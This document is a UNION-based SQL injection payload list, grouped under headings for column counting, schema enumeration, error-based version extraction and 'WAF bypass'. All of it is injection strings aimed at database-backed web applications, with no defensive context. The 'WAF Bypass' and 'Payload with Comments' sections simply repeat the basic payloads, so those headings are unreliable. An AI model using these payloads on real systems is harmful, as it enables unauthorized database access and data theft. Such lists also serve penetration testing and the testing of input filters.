# Basic UNION-based SQLi
' UNION SELECT 1,2,3,4,5 --
' UNION SELECT 1,2,3,4,5 /*
' UNION SELECT 1,2,3,4,5 #
' UNION ALL SELECT 1,2,3,4,5 --
' UNION ALL SELECT 1,2,3,4,5 /*
' UNION ALL SELECT 1,2,3,4,5 #

# Information Gathering
' UNION SELECT 1,2,3,4,5 FROM information_schema.tables --
' UNION SELECT 1,2,3,4,5 FROM information_schema.tables /*
' UNION SELECT 1,2,3,4,5 FROM information_schema.tables #
' UNION SELECT 1,2,3,4,5 FROM information_schema.columns --
' UNION SELECT 1,2,3,4,5 FROM information_schema.columns /*
' UNION SELECT 1,2,3,4,5 FROM information_schema.columns #

# Column Count Testing
' UNION SELECT 1 --
' UNION SELECT 1 /*
' UNION SELECT 1 #
' UNION SELECT 1,2 --
' UNION SELECT 1,2 /*
' UNION SELECT 1,2 #
' UNION SELECT 1,2,3 --
' UNION SELECT 1,2,3 /*
' UNION SELECT 1,2,3 #
' UNION SELECT 1,2,3,4 --
' UNION SELECT 1,2,3,4 /*
' UNION SELECT 1,2,3,4 #
' UNION SELECT 1,2,3,4,5 --
' UNION SELECT 1,2,3,4,5 /*
' UNION SELECT 1,2,3,4,5 #

# Payload with Comments
' UNION SELECT 1,2,3,4,5 --
' UNION SELECT 1,2,3,4,5 /*
' UNION SELECT 1,2,3,4,5 #
' UNION ALL SELECT 1,2,3,4,5 --
' UNION ALL SELECT 1,2,3,4,5 /*
' UNION ALL SELECT 1,2,3,4,5 #

# Payload with Information Gathering
' UNION SELECT 1,2,3,4,5 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a --
' UNION SELECT 1,2,3,4,5 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a /*
' UNION SELECT 1,2,3,4,5 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a #

# WAF Bypass for UNION-based
' UNION SELECT 1,2,3,4,5 --
' UNION SELECT 1,2,3,4,5 /*
' UNION SELECT 1,2,3,4,5 #
' UNION ALL SELECT 1,2,3,4,5 --
' UNION ALL SELECT 1,2,3,4,5 /*
' UNION ALL SELECT 1,2,3,4,5 #
